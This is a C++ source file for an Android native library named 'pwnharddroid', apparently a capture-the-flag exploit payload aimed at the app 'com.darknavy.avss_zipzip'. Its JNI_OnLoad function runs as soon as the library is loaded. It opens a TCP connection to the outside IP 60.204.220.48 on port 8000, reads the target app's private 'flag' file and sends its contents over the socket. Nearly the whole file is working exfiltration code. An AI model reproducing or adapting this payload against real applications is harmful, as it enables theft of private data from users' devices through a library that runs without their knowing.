// Write C++ code here.
//
// Do not forget to dynamically load the C++ library into your application.
//
// For instance,
//
// In MainActivity.java:
//    static {
//       System.loadLibrary("pwnharddroid");
//    }
//
// Or, in MainActivity.kt:
//    companion object {
//      init {
//         System.loadLibrary("pwnharddroid")
//      }
//    }
#include <jni.h>
#include <stdlib.h>
#include <android/log.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>

#define TAG "hackso" // 这个是自定义的LOG的标识
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG,TAG ,__VA_ARGS__) // 定义LOGD类型
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,TAG ,__VA_ARGS__) // 定义LOGI类型
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN,TAG ,__VA_ARGS__) // 定义LOGW类型
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR,TAG ,__VA_ARGS__) // 定义LOGE类型
#define LOGF(...) __android_log_print(ANDROID_LOG_FATAL,TAG ,__VA_ARGS__) // 定义LOGF类型


JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    LOGE("JNI_OnLoading...");
    if (fork() == 0) {
        LOGE("fork() == 0");
    } else {
        LOGE("fork() != 0");
    }

//    if (fork() == 0) {
    if (true) {
        LOGE("Starting exp...");
        int rsSocket;
        int conRes;
        struct sockaddr_in socketAddr;
        char str[20];
        int bytesSent;

        // configure socket address
        socketAddr.sin_family = AF_INET;
        socketAddr.sin_addr.s_addr = inet_addr("60.204.220.48");
        socketAddr.sin_port = htons(8000);

        // create socket connection
        rsSocket = socket(AF_INET, SOCK_STREAM, 0);
        conRes = connect(rsSocket, (struct sockaddr *) &socketAddr, sizeof(socketAddr));
        if (!conRes) {
            LOGE("Con success!");
        } else {
            LOGE("Con fail!");
        }
        sprintf(str, "%d %d", rsSocket, conRes);
        LOGE("%s", str);

        FILE *inFile = fopen("/data/data/com.darknavy.avss_zipzip/files/flag", "r");
        if (inFile != nullptr) {
            char line[100];
            while (fgets(line, sizeof(line), inFile) != nullptr) {
                LOGE("%s", line);
                bytesSent = send(rsSocket, line, strlen(line), 0);
                if (bytesSent == -1) {
                    LOGE("Send line fail!");
                } else {
                    LOGE("Send line success!");
                }
            }
            fclose(inFile);
        } else {
            LOGE("Failed to open file for reading");
        }
    }
    LOGE("lib.so exit.");
    return JNI_VERSION_1_6;
}

